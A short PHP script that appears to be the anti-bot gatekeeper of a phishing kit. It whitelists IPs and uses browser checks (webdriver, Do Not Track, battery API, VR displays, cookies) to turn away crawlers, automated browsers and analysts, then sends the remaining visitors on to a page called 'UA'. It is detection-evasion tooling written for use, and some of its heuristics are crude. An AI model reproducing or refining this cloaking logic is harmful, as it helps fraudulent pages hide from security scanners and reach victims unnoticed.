<?php
session_start();
ob_start();
$Path = getcwd();
require_once 'Settings/Main_AntiBots.php';
require_once 'Settings/Settings.php';
if (($_GET['ua'] == '') !== false){
	$_SESSION['UA'] = $_SERVER['HTTP_USER_AGENT'];
}else{
	$_SESSION['UA'] = $_GET['ua'];
}
can_visit();
$_SESSION['BOT'] = 'true';
$WhiteList = file_get_contents($Path.'/Settings/whitelist.dat');
$WhiteList = explode(PHP_EOL,$WhiteList);
$ip = getIPAddress();
if (in_array($ip,$WhiteList)){
	echo "
		<!DOCTYPE html>
		<html>
		<head>
			<script>
				window.location.assign('UA');
			</script>
		</head>
		<body>

		</body>
		</html>
		";
}else{
	//pass
}
if (strpos(strtolower($block_dnt), 'yes') !== false)
{
	echo "
	<!DOCTYPE html>
	<html>
	<head>
		<script>
			staydown = navigator.doNotTrack;
			if (staydown=='on')
			{
				window.location.href = 'Settings/Page.php?cause=DoNotTrack';
			}else 
			{
				//pass
			}
		</script>
	</head>
	<body>

	</body>
	</html>
	";
	
}
if (strpos(strtolower($block_webdriver), 'yes') !== false)
{
	echo "
	<!DOCTYPE html>
	<html>
	<head>
		<script>
			staydown = navigator.webdriver;
			if (staydown==true)
			{
				window.location.href = 'Settings/Page.php?cause=WebDriver';
			}else 
			{
				//pass
			}
		</script>
	</head>
	<body>

	</body>
	</html>
	";
	

}
if (strpos(strtolower($block_laptops), 'yes') !== false)
{
	echo "
	<!DOCTYPE html>
	<html>
	<head>
		<script>
			try{
				staydown = navigator.getBattery();
				window.location.href = 'Settings/Page.php?cause=Laptop';
			}
			catch(err){
				//pass
			}
		</script>
	</head>
	<body>

	</body>
	</html>
	";
	

}
if (strpos(strtolower($require_cookies), 'yes') !== false)
{
	echo "
	<!DOCTYPE html>
	<html>
	<head>
		<script>
			staydown = navigator.cookieEnabled;
			if (staydown==true)
			{
				//pass
			}else
			{
				window.location.href = 'Settings/Page.php?cause=CookiesDisabled';
			}
		</script>
	</head>
	<body>

	</body>
	</html>
	";
	

}
if (strpos(strtolower($block_virtualdisplay), 'yes') !== false)
{
	echo "
	<!DOCTYPE html>
	<html>
	<head>
		<script>
			try{
				staydown = navigator.getVRDisplays();
				window.location.href = 'Settings/Page.php?cause=RDP';
			}
			catch(err){
				//pass
			}
		</script>
	</head>
	<body>

	</body>
	</html>
	";
	

}
echo "
	<!DOCTYPE html>
	<html>
	<head>
		<script>
			window.location.assign('UA');
		</script>
	</head>
	<body>

	</body>
	</html>
	";
?>